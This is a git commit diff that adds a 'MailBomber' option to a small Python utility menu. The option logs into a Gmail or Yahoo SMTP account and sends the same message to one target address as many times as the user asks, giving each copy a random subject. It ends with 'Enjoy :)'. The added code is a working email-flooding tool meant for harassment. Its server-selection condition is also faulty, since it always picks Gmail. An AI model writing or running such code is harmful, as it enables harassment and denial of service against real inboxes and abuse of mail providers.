35d3fa124db44afaa9f7dc8a8a2c74a1b9b01f6d
Sahand <sahandsabet85@gmail.com>
2021-05-13 12:10:50 +0430

    Adding mail bomber

--- main.py
+++ main.py
@@ -2,12 +2,18 @@ import cryptocompare
 import socket
 import whois
 import os
+import sys
+import smtplib
+import getpass
+import time
+
 while True:
     print(" ** Which one Do you want?")
-    print("\n ** 1.My IP     **")
-    print(" ** 2.BTC Price **")
-    print(" ** 3.Whois     **")
-    print(" ** 0.Exit      **")
+    print("\n ** 1.My IP      **")
+    print(" ** 2.BTC Price  **")
+    print(" ** 3.Whois      **")
+    print(" ** 4.MailBomber **")
+    print(" ** 0.Exit       **")
     men = int(input(" ))=>> "))
     if men == 1:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -22,6 +28,42 @@ while True:
         site = input(" ))=>> ")
         w = whois.whois(site)
         print(w)
+    elif men == 4:
+        server = input (' ** MailServer 1.Gmail/2.Yahoo: ')
+        user = input(' ** Email: ')
+        passwd = getpass.getpass(' ** Password: ')
+        to = input('\n ** To: ')
+        body = input(' ** Message: ')
+        total = int(input(' ** Number of send: '))
+        if server == 'gmail' or '1' or 'Gmail':
+            smtp_server = 'smtp.gmail.com'
+            port = 587
+        elif server == 'yahoo' or '2' or 'Yahoo':
+            smtp_server = 'smtp.mail.yahoo.com'
+            port = 25
+        else:
+            print(' ** Kindly Enter Your Answer in 1 or 2 in Mail Server.')
+            sys.exit()
+        print ('')
+        try:
+            server = smtplib.SMTP(smtp_server,port)
+            server.ehlo()
+            if smtp_server == "smtp.gmail.com":
+                server.starttls()
+            server.login(user,passwd)
+            for i in range(1, total+1):
+                subject = os.urandom(9)
+                msg = "From: "+str(user)+"\nSubject: "+str(subject)+"\n"+str(body)
+                server.sendmail(user,to,msg)
+                print ("\r ** [+]E-mails sent: %i" % i)
+                sys.stdout.flush()
+            server.quit()
+            print ('\n ** Done  !!!')
+            print ('                                                  BomMail :~ Enjoy :)')
+        except KeyboardInterrupt:
+            print (' ** [-] Canceled')
+        except smtplib.SMTPAuthenticationError:
+            print ('\n ** [!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps')
     elif men == 0:
         break;
     ose = input("\n\n\t** Enter a key to exit .")
